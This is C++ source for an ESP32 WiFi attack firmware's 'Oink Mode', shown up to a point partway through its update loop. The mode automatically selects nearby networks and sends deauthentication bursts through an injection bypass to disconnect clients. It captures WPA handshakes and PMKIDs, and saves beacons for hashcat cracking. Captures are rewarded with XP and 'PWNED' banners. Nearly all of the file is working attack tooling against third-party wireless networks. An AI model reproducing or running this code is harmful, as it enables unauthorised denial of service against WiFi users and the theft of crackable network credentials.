// Oink Mode implementation

#include "oink.h"
#include "oink_capture_filters.h"
#include "do_no_ham.h"
#include "warhog.h"
#include "../core/porkchop.h"
#include "../core/config.h"
#include "../core/wsl_bypasser.h"
#include "../core/wifi_utils.h"
#include "../core/heap_gates.h"
#include "../core/sdlog.h"
#include "../core/sd_layout.h"
#include "../core/xp.h"
#include "../core/heap_policy.h"
#include "../core/heap_health.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include "../piglet/avatar.h"
#include "../audio/sfx.h"
#include "../ui/flexes_screen.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>  // For BLE coexistence check
#include <SD.h>
#include <algorithm>
#include <cstdarg>  // For va_list in deferred logging
#include <esp_heap_caps.h>
#include <atomic>  // For atomic beaconCaptured flag
#include "../core/janus_hog.h"

// NOTE: Vector mutex moved to NetworkRecon - use NetworkRecon::enterCritical()/exitCritical()
// This ensures all modes (OINK, DoNoHam, Spectrum) use the SAME mutex for the shared networks vector

// Simple flag to avoid concurrent access between promiscuous callback and main thread
// NOTE: oinkBusy is now SECONDARY protection - spinlock is PRIMARY
// The promiscuous callback runs in WiFi task context (not true ISR), but still needs
// synchronization to prevent race conditions on networks/handshakes vectors
static std::atomic<bool> oinkBusy{false};

// Cache our current STA MAC so we can treat EAPOL frames destined for us as PMKID probe traffic.
// Populated in OinkMode::start() after NetworkRecon has set up WiFi (and optional MAC randomization).
static uint8_t ourStaMac[6] = {0};
static bool ourStaMacValid = false;

// Minimum free heap thresholds (centralized in HeapPolicy)
static const size_t HANDSHAKE_ALLOC_MIN_BLOCK = sizeof(CapturedHandshake) + HeapPolicy::kHandshakeAllocSlack;
static const size_t PMKID_ALLOC_MIN_BLOCK = sizeof(CapturedPMKID) + HeapPolicy::kPmkidAllocSlack;

// ============ Deferred Event System ============
// Callback sets flags/data, update() processes them in main thread context
// This avoids heap operations, String allocations, and Serial.printf in callback

// NOTE: pendingNetworkAdd/pendingNetwork removed - NetworkRecon now handles network discovery
// OINK only tracks mood events, handshakes, and PMKIDs

// Pending mood events (callback sets flag, update() calls Mood functions)
static volatile bool pendingNewNetwork = false;
static char pendingNetworkSSID[33] = {0};
static int8_t pendingNetworkRSSI = 0;
static uint8_t pendingNetworkChannel = 0;

static volatile bool pendingDeauthSuccess = false;
static uint8_t pendingDeauthStation[6] = {0};

static volatile bool pendingHandshakeComplete = false;
static char pendingHandshakeSSID[33] = {0};
static volatile bool pendingAutoSave = false;  // Trigger autoSaveCheck from main loop

static volatile bool pendingPMKIDCapture = false;
static char pendingPMKIDSSID[33] = {0};

// Deferred EAPOL diagnostic log (callback sets, update() prints)
static volatile uint8_t pendingEapolMsg = 0;  // 0 = none, 1-4 = M1-M4
static uint8_t pendingEapolBssid[6] = {0};
static uint8_t pendingEapolStation[6] = {0};
static uint8_t pendingEapolFlags = 0;  // bit0: stationIsOurs

// Visibility: handshake creation blocks (main thread only; printed rate-limited in update()).
static uint32_t hsCreateBlockedCap = 0;
static uint32_t hsCreateBlockedPressure = 0;
static uint32_t hsCreateBlockedFree = 0;
static uint32_t hsCreateBlockedFrag = 0;

// Callback for NetworkRecon new network discovery -> XP events
static void onNewNetworkDiscovered(wifi_auth_mode_t authmode, bool isHidden,
                                   const char* ssid, int8_t rssi, uint8_t channel) {
    // Skip weak networks — not actionable for attack modes
    if (rssi < Config::wifi().attackMinRssi) return;
    Avatar::waveRipple(WaveMode::INCOMING);
    // Queue mood event for main thread (Mood::onNewNetwork triggers XP::addXP)
    if (!pendingNewNetwork) {
        if (ssid) {
            strncpy(pendingNetworkSSID, ssid, 32);
            pendingNetworkSSID[32] = 0;
        } else {
            pendingNetworkSSID[0] = 0;
        }
        pendingNetworkRSSI = rssi;
        pendingNetworkChannel = channel;
        pendingNewNetwork = true;
    }
}

// Pending handshake/PMKID creation (callback queues, update() does push_back)
// This avoids vector reallocation in callback context
struct PendingHandshakeFrame {
    uint8_t bssid[6];
    uint8_t station[6];
    uint8_t messageNum;        // DEPRECATED - used only for logging now
    EAPOLFrame frames[4];      // Store all 4 EAPOL frames (M1-M4)
    uint8_t capturedMask;      // Bitmask: bit0=M1, bit1=M2, bit2=M3, bit3=M4
    uint8_t pmkid[16];         // If M1, may contain PMKID
    bool hasPMKID;
};

// Circular buffer for pending handshake frames (4 slots to handle rapid EAPOL bursts)
// STATIC POOL: Pre-allocated to avoid malloc in WiFi callback context (heap fragmentation risk)
// WARNING: Each PendingHandshakeFrame is ~3.3KB (contains 4x EAPOLFrame @ 822 bytes each)
// Total static pool: 4 * 3.3KB = ~13KB permanently in .bss - reduces heap even when idle!
static const uint8_t PENDING_HS_SLOTS = 4;
static PendingHandshakeFrame pendingHsPool[PENDING_HS_SLOTS];  // Static pool - no heap ops in callback
// #region agent log
// [DEBUG] H1: This static pool uses ~13KB of RAM - logged at compile time in .bss
// Size info logged in init() below
// #endregion
static PendingHandshakeFrame* pendingHandshakes[PENDING_HS_SLOTS] = {nullptr, nullptr, nullptr, nullptr};
static std::atomic<uint8_t> pendingHsWrite{0};
static std::atomic<uint8_t> pendingHsRead{0};
static std::atomic<bool> pendingHsBusy[PENDING_HS_SLOTS] = {
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false)
};
static std::atomic<bool> pendingHsAllocated[PENDING_HS_SLOTS] = {  // Track which pool slots are in use
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false),
    ATOMIC_VAR_INIT(false)
};

struct PendingPMKIDCreate {
    uint8_t bssid[6];
    uint8_t station[6];
    uint8_t pmkid[16];
    char ssid[33];
};
static const uint8_t PENDING_PMKID_SLOTS = 4;
static PendingPMKIDCreate pendingPMKIDPool[PENDING_PMKID_SLOTS];
static std::atomic<uint8_t> pendingPmkidWrite{0};
static std::atomic<uint8_t> pendingPmkidRead{0};

static bool enqueuePendingPMKID(const uint8_t* bssid, const uint8_t* station,
                                 const uint8_t* pmkidData, const char* ssid) {
    uint8_t write = pendingPmkidWrite.load(std::memory_order_relaxed);
    uint8_t next = (uint8_t)((write + 1) % PENDING_PMKID_SLOTS);
    uint8_t read = pendingPmkidRead.load(std::memory_order_acquire);
    if (next == read) return false;  // Queue full
    PendingPMKIDCreate& slot = pendingPMKIDPool[write];
    memcpy(slot.bssid, bssid, 6);
    memcpy(slot.station, station, 6);
    memcpy(slot.pmkid, pmkidData, 16);
    if (ssid && ssid[0] != 0) {
        strncpy(slot.ssid, ssid, 32);
        slot.ssid[32] = 0;
    } else {
        slot.ssid[0] = 0;
    }
    pendingPmkidWrite.store(next, std::memory_order_release);
    return true;
}

static bool dequeuePendingPMKID(PendingPMKIDCreate& out) {
    uint8_t read = pendingPmkidRead.load(std::memory_order_relaxed);
    uint8_t write = pendingPmkidWrite.load(std::memory_order_acquire);
    if (read == write) return false;  // Queue empty
    out = pendingPMKIDPool[read];
    pendingPmkidRead.store((uint8_t)((read + 1) % PENDING_PMKID_SLOTS), std::memory_order_release);
    return true;
}



// Static members
bool OinkMode::running = false;
bool OinkMode::scanning = false;
bool OinkMode::deauthing = false;
bool OinkMode::channelHopping = true;
uint8_t OinkMode::currentChannel = 1;
uint32_t OinkMode::lastHopTime = 0;
uint32_t OinkMode::lastScanTime = 0;
static uint32_t lastCleanupTime = 0;

// networks reference - now uses shared NetworkRecon vector
// This provides backward compatibility with existing code that uses 'networks'
static inline std::vector<DetectedNetwork>& networks() {
    return NetworkRecon::getNetworks();
}
std::vector<CapturedHandshake> OinkMode::handshakes;
std::vector<CapturedPMKID> OinkMode::pmkids;
int OinkMode::targetIndex = -1;
uint8_t OinkMode::targetBssid[6] = {0};
char OinkMode::targetSSIDCache[33] = {0};
uint8_t OinkMode::targetClientCountCache = 0;
uint8_t OinkMode::targetBssidCache[6] = {0};
bool OinkMode::targetHiddenCache = false;
bool OinkMode::targetCacheValid = false;
DetectedClient OinkMode::targetClients[MAX_CLIENTS_PER_NETWORK] = {};
uint8_t OinkMode::targetClientCount = 0;
int OinkMode::selectionIndex = 0;
std::atomic<uint32_t> OinkMode::packetCount{0};
uint32_t OinkMode::deauthCount = 0;
uint16_t OinkMode::filteredCount = 0;
uint64_t OinkMode::filteredCache[64] = {0};
uint8_t OinkMode::filteredCacheIndex = 0;

// Memory limits to prevent OOM
const size_t MAX_NETWORKS = 200;       // Max tracked networks
const size_t MAX_HANDSHAKES = 50;      // Max handshakes (each can be large)
const size_t MAX_PMKIDS = 50;          // Max PMKIDs (smaller than handshakes)
const uint16_t MAX_BEACON_SIZE = 1500; // IEEE 802.11 practical limit (protect against oversized/malformed frames)

// Protocol constants
static const uint8_t MAC_ADDR_LEN = 6;
static const uint8_t SSID_MAX_LEN = 32;
static const uint8_t SSID_BUF_LEN = 33;  // SSID + null terminator
static const uint8_t PMKID_LEN = 16;
static const uint8_t PMKID_KDE_TOTAL_LEN = 22;  // dd(1) + len(1) + OUI(3) + type(1) + PMKID(16)
static const uint16_t EAPOL_MIN_LEN = 99;  // Minimum EAPOL-Key frame size
static const uint16_t EAPOL_MAX_PAYLOAD = 512;  // Max EAPOL payload for storage
static const uint16_t FRAME_MAX_CAPTURE = 300;  // Max full 802.11 frame size for PCAP
static const uint16_t DEAUTH_FRAME_SIZE = 26;
static const uint16_t BEACON_FIXED_FIELDS = 36;  // Fixed fields before IEs
static const uint16_t EAPOL_MIC_OFFSET = 81;  // MIC field offset in EAPOL-Key
static const uint16_t EAPOL_ANONCE_OFFSET = 17;  // ANonce field offset in EAPOL-Key
static const uint16_t EAPOL_KEYDATA_LEN_OFFSET = 97;  // Key Data Length field offset
static const uint16_t EAPOL_KEYDATA_OFFSET = 99;  // Key Data field offset

// Timing constants
static const uint32_t DEAUTH_BURST_INTERVAL_MS = 180;  // Optimal deauth burst interval (prevents queue saturation)
static const uint32_t DEAUTH_POST_M1_LISTEN_MS = 1200; // Pause deauth briefly after M1 to capture handshake

// Callback (WiFi task) sets this when target M1 is observed; main loop reads it.
static std::atomic<uint32_t> deauthPauseUntilMs{0};

// Beacon frame storage for PCAP (required for hashcat)
static uint8_t beaconFrameStorage[MAX_BEACON_SIZE] = {0};
uint8_t* OinkMode::beaconFrame = beaconFrameStorage;
uint16_t OinkMode::beaconFrameLen = 0;
std::atomic<bool> OinkMode::beaconCaptured{false};  // Atomic initialization for thread safety

// BOAR BROS - excluded networks (fixed array in BSS, zero heap)
OinkMode::BoarBro OinkMode::boarBros[50] = {};
uint16_t OinkMode::boarBrosCount = 0;
static const size_t MAX_BOAR_BROS = 50;  // Max excluded networks

// Channel hop order (most common channels first)
const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const uint8_t CHANNEL_COUNT = sizeof(CHANNEL_HOP_ORDER);
uint8_t currentHopIndex = 0;

// Deauth timing
static uint32_t lastDeauthTime = 0;
static uint32_t lastMoodUpdate = 0;

// Non-blocking deauth burst state machine (Change 1 + Change 6)
// Replaces blocking sendDeauthBurst loop with cooperative scheduling.
// Phase 0 = initial knock (2 fast frames <5ms), Phase 1 = maintenance drip (1 per 250ms)
struct DeauthBurstState {
    uint8_t targetBssid[6];
    uint8_t clientMac[6];
    uint8_t frameCount;       // Total frames remaining in current phase
    uint8_t phase;            // 0=knock, 1=maintenance
    uint8_t direction;        // 0=AP->client, 1=client->AP
    uint8_t clientIndex;      // Which client we're deauthing (for multi-client)
    uint8_t clientTotal;      // Total clients to cycle through
    uint8_t clientMacs[MAX_CLIENTS_PER_NETWORK][6]; // Snapshot of all client MACs
    uint32_t nextSendTime;    // millis() when next frame should be sent
    bool active;              // Burst in progress
};
static DeauthBurstState deauthBurst = {};
static const uint32_t DEAUTH_KNOCK_INTERVAL_MS = 3;    // Fast knock: ~3ms between frames
static const uint32_t DEAUTH_MAINTENANCE_MS = 250;      // Maintenance drip: 1 frame per 250ms

// Handshake completion flag - O(1) check replaces O(H*N) vector scan (Change 9)
static volatile bool handshakeJustCompleted = false;
static uint8_t justCompletedBssid[6] = {0};

// Random hunting sniff - periodic sniff to show piglet is actively hunting
static uint32_t lastRandomSniff = 0;
static const int RANDOM_SNIFF_CHANCE = 8;  // 8% chance per second = ~12 sec average

void OinkMode::recordFilteredNetwork(const uint8_t* bssid) {
    uint64_t key = bssidToUint64(bssid);
    for (size_t i = 0; i < sizeof(filteredCache) / sizeof(filteredCache[0]); i++) {
        if (filteredCache[i] == key) {
            return;
        }
    }
    filteredCache[filteredCacheIndex] = key;
    filteredCacheIndex = (filteredCacheIndex + 1) % (sizeof(filteredCache) / sizeof(filteredCache[0]));
    if (filteredCount < 999) {
        filteredCount++;
    }
}

// Auto-attack state machine (like M5Gotchi)
enum class AutoState {
    SCANNING,       // Scanning for networks
    PMKID_HUNTING,  // Active PMKID probing phase
    LOCKING,        // Locked to target channel, discovering clients
    ATTACKING,      // Deauthing + sniffing target
    WAITING,        // Delay between attacks
    NEXT_TARGET,    // Move to next target
    BORED           // No targets available - pig is bored
};
static AutoState autoState = AutoState::SCANNING;
static uint32_t stateStartTime = 0;
static uint32_t attackStartTime = 0;
static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
// LOCK_TIME now uses FlexesScreen::getLockTime() for class buff support
static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
static const uint32_t WAIT_TIME = 4500;         // 4.5 sec between targets (allows late EAPOL M3/M4)
static const uint32_t BORED_RETRY_TIME = 30000; // 30 sec between retry scans when bored
static const uint32_t BORED_THRESHOLD = 3;      // Failed target attempts before bored

// PMKID hunting variables
static int pmkidTargetIndex = 0;
static uint32_t pmkidProbeTime = 0;
static const uint32_t PMKID_TIMEOUT = 300;      // 300ms wait per AP
static const uint32_t PMKID_HUNT_MAX = 30000;   // 30s total hunt window
static uint64_t pmkidProbedBitset = 0;           // Tracks probed networks (up to 64)

// Targeting heuristics
static const uint32_t CLIENT_RECENT_MS = 10000;      // Prefer clients seen within 10s
static const uint32_t LOCK_FAST_TRACK_MS = 2500;     // Fast-track lock when clients appear quickly
static const uint32_t LOCK_EARLY_EXIT_MS = 4000;     // Bail if no clients show up quickly
// Attack cooldown is now RSSI-scaled (4-12s) — see ATTACKING timeout handler

// Target warm-up gate (avoid locking before recon has signal density)
static const uint32_t TARGET_WARMUP_MIN_MS = 1500;    // Minimum time before target selection
static const uint32_t TARGET_WARMUP_FORCE_MS = 5000;  // Allow targeting even if quiet
static const uint32_t TARGET_WARMUP_MIN_PACKETS = 200;
static const uint8_t TARGET_WARMUP_MIN_NETWORKS = 2;
static const uint8_t TARGET_MAX_ATTEMPTS = 4;

// Bored state tracking
static uint8_t consecutiveFailedScans = 0;      // Track failed getNextTarget() calls
static uint32_t lastBoredUpdate = 0;            // For periodic bored mood updates

// Recon warm-up tracking
static uint32_t oinkStartMs = 0;
static uint32_t reconPacketStart = 0;

static bool isWarmForTargets(uint32_t now);
static uint8_t computeQualityScore(const DetectedNetwork& net, uint32_t now);
static int computeTargetScore(const DetectedNetwork& net, uint32_t now);
static bool isEligibleTarget(const DetectedNetwork& net, uint32_t now);

// WAITING state variables (reset in init() to prevent stale state on restart)
static bool checkedForPendingHandshake = false;
static bool hasPendingHandshake = false;

// Reset bored state on init
static bool boredStateReset = true;  // Flag to reset on start()

// Background C5 5GHz attack (runs independently of autoState - JANUS HOG)
// Fire-and-forget: dispatch to C5, continue 2.4GHz hunting while it works
static bool c5BackgroundActive = false;
static uint8_t c5BackgroundBssid[6] = {0};
static char c5BackgroundSSID[33] = {0};
static uint32_t c5BackgroundStartTime = 0;
static const uint32_t C5_BACKGROUND_TIMEOUT = 45000;  // 45s max per 5GHz target

// Last pwned network SSID for display
static char lastPwnedSSID[33] = "";

void OinkMode::init() {
    // #region agent log
    // [DEBUG] H1: Log static pool size to confirm ~13KB allocation
    Serial.printf("[DBG-OINK] pendingHsPool size: %u bytes (%u slots x %u each)\n",
                  (unsigned)(sizeof(pendingHsPool)), 
                  (unsigned)PENDING_HS_SLOTS,
                  (unsigned)sizeof(PendingHandshakeFrame));
    Serial.printf("[DBG-OINK] EAPOLFrame size: %u bytes\n", (unsigned)sizeof(EAPOLFrame));
    Serial.printf("[DBG-OINK] Heap before init: free=%u largest=%u\n",
                  (unsigned)ESP.getFreeHeap(),
                  (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
    // #endregion
    
    // Reset busy flag in case of abnormal stop
    oinkBusy = false;
    
    // Reset deferred event system
    pendingNewNetwork = false;
    pendingDeauthSuccess = false;
    pendingHandshakeComplete = false;
    pendingPMKIDCapture = false;
    pendingEapolMsg = 0;
    
    // Reset bored state tracking
    consecutiveFailedScans = 0;
    lastBoredUpdate = 0;
    boredStateReset = true;

    // Reset static pool tracking (no heap ops - pool is pre-allocated)
    for (int i = 0; i < PENDING_HS_SLOTS; i++) {
        pendingHandshakes[i] = nullptr;
        pendingHsBusy[i] = false;
        pendingHsAllocated[i] = false;
    }
    pendingHsWrite = 0;
    pendingHsRead = 0;
    pendingPmkidWrite = 0;
    pendingPmkidRead = 0;

    // Free per-handshake beacon memory
    for (auto& hs : handshakes) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
    }
    
    // networks vector is now managed by NetworkRecon - just clear OINK-specific data
    handshakes.clear();
    handshakes.shrink_to_fit();
    pmkids.clear();
    pmkids.shrink_to_fit();

    handshakes.reserve(5);
    pmkids.reserve(10);
    filteredCount = 0;
    memset(filteredCache, 0, sizeof(filteredCache));
    filteredCacheIndex = 0;
    
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    clearTargetClients();
    selectionIndex = 0;
    packetCount.store(0, std::memory_order_relaxed);
    deauthCount = 0;
    currentHopIndex = 0;
    deauthPauseUntilMs.store(0, std::memory_order_relaxed);
    
    // Reset state machine
    autoState = AutoState::SCANNING;
    stateStartTime = 0;
    attackStartTime = 0;
    lastDeauthTime = 0;
    lastPwnedSSID[0] = '\0';
    lastMoodUpdate = 0;
    lastRandomSniff = 0;
    checkedForPendingHandshake = false;
    hasPendingHandshake = false;

    // Reset non-blocking deauth burst state
    deauthBurst.active = false;
    memset(&deauthBurst, 0, sizeof(deauthBurst));

    // Reset handshake completion flag
    handshakeJustCompleted = false;
    memset(justCompletedBssid, 0, 6);

    // Reset background C5 attack state
    c5BackgroundActive = false;
    memset(c5BackgroundBssid, 0, 6);
    c5BackgroundSSID[0] = '\0';

    // Clear beacon frame (static storage, no free)
    beaconFrame = beaconFrameStorage;
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    // Load BOAR BROS exclusion list
    loadBoarBros();
}

void OinkMode::start() {
    if (running) return;
    
    Serial.printf("[OINK] Starting... free=%u largest=%u\n",
                  ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
    
    // Ensure NetworkRecon is running (handles WiFi promiscuous mode)
    if (!NetworkRecon::isRunning()) {
        NetworkRecon::start();
    }
    
    // Initialize WSL bypasser for deauth frame injection
    WSLBypasser::init();

    // Cache our STA MAC so we can filter probe-induced EAPOL traffic (station == our MAC).
    // IMPORTANT: NetworkRecon may randomize the STA MAC on start(), so read it after ensuring recon is running.
    esp_err_t macErr = esp_wifi_get_mac(WIFI_IF_STA, ourStaMac);
    ourStaMacValid = (macErr == ESP_OK);
    if (!ourStaMacValid) {
        memset(ourStaMac, 0, sizeof(ourStaMac));
        Serial.printf("[OINK] STA MAC read failed (%d); probe filtering disabled\n", (int)macErr);
    } else {
        Serial.printf("[OINK] STA MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      ourStaMac[0], ourStaMac[1], ourStaMac[2], ourStaMac[3], ourStaMac[4], ourStaMac[5]);
    }

    // Reset visibility counters for this run
    hsCreateBlockedCap = 0;
    hsCreateBlockedPressure = 0;
    hsCreateBlockedFree = 0;
    hsCreateBlockedFrag = 0;
    
    // Register our packet callback for EAPOL/handshake capture
    NetworkRecon::setPacketCallback(promiscuousCallback);
    
    // Register callback for new network discovery (triggers XP events)
    NetworkRecon::setNewNetworkCallback(onNewNetworkDiscovered);
    
    running = true;
    scanning = true;
    channelHopping = true;
    lastHopTime = millis();
    lastScanTime = millis();
    oinkStartMs = lastScanTime;
    reconPacketStart = NetworkRecon::getPacketCount();
    
    // Set grass animation speed for OINK mode
    Avatar::setGrassSpeed(120);  // ~8 FPS casual trot
    
    // Initialize auto-attack state machine
    autoState = AutoState::SCANNING;
    stateStartTime = millis();
    selectionIndex = 0;
    
    Mood::setStatusMessage("hunting truffles");
    Mood::setDialogueLock(true);
    Display::setWiFiStatus(true);
    
    Serial.printf("[OINK] Started. Networks available: %d\n", NetworkRecon::getNetworkCount());
}

void OinkMode::stop() {
    if (!running) return;
    
    Serial.println("[OINK] Stopping...");
    
    deauthing = false;
    scanning = false;
    deauthBurst.active = false;  // Clear any in-progress burst

    // Clear scanning dwell override
    NetworkRecon::setHopIntervalOverride(0);

    // Stop grass animation, tree, and wave ripples
    Avatar::setGrassMoving(false);
    Avatar::hideTree();
    Avatar::waveRipple(WaveMode::NONE);

    // Clear our callbacks (NetworkRecon keeps running)
    NetworkRecon::setPacketCallback(nullptr);
    NetworkRecon::setNewNetworkCallback(nullptr);
    
    // Unlock channel if we locked it
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    
    // Process any deferred XP saves
    XP::processPendingSave();
    
    // Cancel any in-progress C5 5GHz background attack
    if (c5BackgroundActive) {
        JanusHog::requestStop();
        JanusHog::clearHandshakeResult();
        c5BackgroundActive = false;
    }
    clearTarget();

    // Reset beacon frame (static storage, no free)
    beaconFrame = beaconFrameStorage;
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    // Free per-handshake beacon memory to prevent leaks on repeated start/stop
    for (auto& hs : handshakes) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
    }
    
    // FIX: Release vector capacity to recover heap (~6KB leak)
    handshakes.clear();
    handshakes.shrink_to_fit();
    pmkids.clear();
    pmkids.shrink_to_fit();
    
    // Reset static pool tracking (no heap ops - pool is pre-allocated)
    for (int i = 0; i < PENDING_HS_SLOTS; i++) {
        pendingHandshakes[i] = nullptr;
        pendingHsBusy[i] = false;
        pendingHsAllocated[i] = false;
    }
    pendingHsWrite = 0;
    pendingHsRead = 0;
    pendingPmkidWrite = 0;
    pendingPmkidRead = 0;

    running = false;
    Mood::setDialogueLock(false);
    Display::setWiFiStatus(false);
    
    Serial.printf("[OINK] Stopped. Networks: %d, Handshakes: %d\n", 
                  NetworkRecon::getNetworkCount(), handshakes.size());
}

void OinkMode::update() {
    if (!running) return;
    
    uint32_t now = millis();
    
    // #region agent log - HEAP INSTRUMENTATION
    // Track heap every 500ms to catch the exact moment it improves
    static uint32_t lastHeapLog = 0;
    static size_t lastLargest = 0;
    if (now - lastHeapLog > 500) {
        size_t currentLargest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
        size_t currentFree = ESP.getFreeHeap();
        
        // Log if this is first call or if heap changed significantly (>5KB)
        if (lastHeapLog == 0 || abs((int)currentLargest - (int)lastLargest) > 5000) {
            Serial.printf("[OINK-UPDATE] t=%ums free=%u largest=%u delta=%+d pkts=%u nets=%u\n",
                          now - stateStartTime,
                          currentFree, currentLargest,
                          (int)currentLargest - (int)lastLargest,
                          packetCount.load(), networks().size());
        }
        lastLargest = currentLargest;
        lastHeapLog = now;
    }
    // #endregion

    // Rate-limited visibility: handshake/PMKID pool and handshake-create block reasons.
    static uint32_t lastStatsLog = 0;
    if (now - lastStatsLog >= 5000) {
        Serial.printf("[OINK-STATS] hs=%u/%u pmkids=%u/%u hsBlk{cap=%u pressure=%u free=%u frag=%u}\n",
                      (unsigned)handshakes.size(), (unsigned)handshakes.capacity(),
                      (unsigned)pmkids.size(), (unsigned)pmkids.capacity(),
                      (unsigned)hsCreateBlockedCap,
                      (unsigned)hsCreateBlockedPressure,
                      (unsigned)hsCreateBlockedFree,
                      (unsigned)hsCreateBlockedFrag);
        lastStatsLog = now;
    }
    
    // Guard access to networks/handshakes vectors from promiscuous callback
    // NOTE: oinkBusy is secondary protection, spinlock is primary
    oinkBusy = true;
    
    // ============ Process Deferred Events from Callback ============
    // These events were queued in promiscuous callback to avoid heap/String ops there
    
    // NOTE: Network discovery is now handled by NetworkRecon::processDeferredEvents()
    // OINK no longer needs to process pendingNetworkAdd - this was dead code after the refactor.
    
    // Process pending mood: new network discovered
    char pendingSSIDCopy[33] = {0};
    int8_t pendingRSSICopy = 0;
    uint8_t pendingChannelCopy = 0;
    bool hasPendingNewNetwork = false;
    NetworkRecon::enterCritical();
    if (pendingNewNetwork) {
        strncpy(pendingSSIDCopy, pendingNetworkSSID, 32);
        pendingSSIDCopy[32] = 0;
        pendingRSSICopy = pendingNetworkRSSI;
        pendingChannelCopy = pendingNetworkChannel;
        pendingNewNetwork = false;
        hasPendingNewNetwork = true;
    }
    NetworkRecon::exitCritical();
    if (hasPendingNewNetwork) {
        Mood::onNewNetwork(pendingSSIDCopy, pendingRSSICopy, pendingChannelCopy);
    }
    
    // Process pending mood: deauth success
    uint8_t pendingStationCopy[6] = {0};
    bool hasPendingDeauth = false;
    NetworkRecon::enterCritical();
    if (pendingDeauthSuccess) {
        memcpy(pendingStationCopy, pendingDeauthStation, sizeof(pendingStationCopy));
        pendingDeauthSuccess = false;
        hasPendingDeauth = true;
    }
    NetworkRecon::exitCritical();
    if (hasPendingDeauth) {
        Mood::onDeauthSuccess(pendingStationCopy);
        Avatar::dropFruit();
        // M1 observed for target: stop active jamming and switch to listen phase.
        // Continuing deauth here can suppress M2/M3 and cause handshake miss.
        if (autoState == AutoState::ATTACKING) {
            deauthBurst.active = false;  // Immediately clear non-blocking burst
            autoState = AutoState::WAITING;
            stateStartTime = now;
            deauthing = false;
            deauthPauseUntilMs.store(0, std::memory_order_relaxed);
            checkedForPendingHandshake = false;
            hasPendingHandshake = false;
        }
    }
    
    // Process pending mood: handshake complete
    char pendingHandshakeCopy[33] = {0};
    bool hasPendingHandshakeDone = false;
    NetworkRecon::enterCritical();
    if (pendingHandshakeComplete) {
        strncpy(pendingHandshakeCopy, pendingHandshakeSSID, 32);
        pendingHandshakeCopy[32] = 0;
        pendingHandshakeComplete = false;
        hasPendingHandshakeDone = true;
    }
    NetworkRecon::exitCritical();
    if (hasPendingHandshakeDone) {
        Mood::onHandshakeCaptured(pendingHandshakeCopy);
        strncpy(lastPwnedSSID, pendingHandshakeCopy, sizeof(lastPwnedSSID) - 1);
        lastPwnedSSID[sizeof(lastPwnedSSID) - 1] = '\0';
        Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
    }
    
    // Process pending mood: PMKID captured (clientless attack - extra special!)
    char pendingPMKIDCopy[33] = {0};
    bool hasPendingPMKID = false;
    NetworkRecon::enterCritical();
    if (pendingPMKIDCapture) {
        strncpy(pendingPMKIDCopy, pendingPMKIDSSID, 32);
        pendingPMKIDCopy[32] = 0;
        pendingPMKIDCapture = false;
        hasPendingPMKID = true;
    }
    NetworkRecon::exitCritical();
    if (hasPendingPMKID) {
        Mood::onPMKIDCaptured(pendingPMKIDCopy);
        strncpy(lastPwnedSSID, pendingPMKIDCopy, sizeof(lastPwnedSSID) - 1);
        lastPwnedSSID[sizeof(lastPwnedSSID) - 1] = '\0';
        Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
        SDLog::log("OINK", "PMKID captured: %s", pendingPMKIDCopy);
        
        // BUG FIX: Trigger auto-save for PMKID (was missing, causing beeps but no file)
        pendingAutoSave = true;
    }
    
    // Diagnostic: EAPOL frame received (deferred from callback)
    uint8_t eapolMsg = pendingEapolMsg;  // volatile read
    if (eapolMsg) {
        uint8_t bssidCopy[6];
        uint8_t stationCopy[6];
        uint8_t flagsCopy = pendingEapolFlags;
        memcpy(bssidCopy, pendingEapolBssid, 6);
        memcpy(stationCopy, pendingEapolStation, 6);
        pendingEapolMsg = 0;
        Serial.printf("[OINK] EAPOL M%d b=%02X:%02X:%02X:%02X:%02X:%02X s=%02X:%02X:%02X:%02X:%02X:%02X%s\n",
                      eapolMsg,
                      bssidCopy[0], bssidCopy[1], bssidCopy[2], bssidCopy[3], bssidCopy[4], bssidCopy[5],
                      stationCopy[0], stationCopy[1], stationCopy[2], stationCopy[3], stationCopy[4], stationCopy[5],
                      (flagsCopy & 0x01) ? " (to-us)" : "");
    }

    // Process pending auto-save (callback set flag, we do SD I/O here)
    bool shouldAutoSave = false;
    NetworkRecon::enterCritical();
    if (pendingAutoSave) {
        pendingAutoSave = false;
        shouldAutoSave = true;
    }
    NetworkRecon::exitCritical();
    // IMPORTANT: don't run autoSaveCheck() while oinkBusy is true.
    // autoSaveCheck pauses promiscuous mode and does SD I/O, which can drop EAPOL frames.
    
    // Process pending handshake creation from circular buffer (callback queued, we do push_back here)
    while (pendingHsRead != pendingHsWrite) {
        // Get slot from circular buffer
        uint8_t slot = pendingHsRead;
        if (!pendingHandshakes[slot]) {
            break;  // Not allocated yet, wait for next cycle
        }
        // CAS acquire: atomically set busy=true if currently false.
        // Prevents concurrent access if the WiFi callback (core 1)
        // is updating this slot's frame data at the same time.
        bool expected = false;
        if (!pendingHsBusy[slot].compare_exchange_strong(expected, true)) {
            break;  // Callback is writing to this slot, wait for next cycle
        }
        
        // Create or find handshake entry in main thread context
        int idx = findOrCreateHandshakeSafe(pendingHandshakes[slot]->bssid, pendingHandshakes[slot]->station);
        if (idx >= 0) {
            CapturedHandshake& hs = handshakes[idx];
            
            // Process ALL queued frames (M1-M4) from capturedMask
            for (int msgIdx = 0; msgIdx < 4; msgIdx++) {
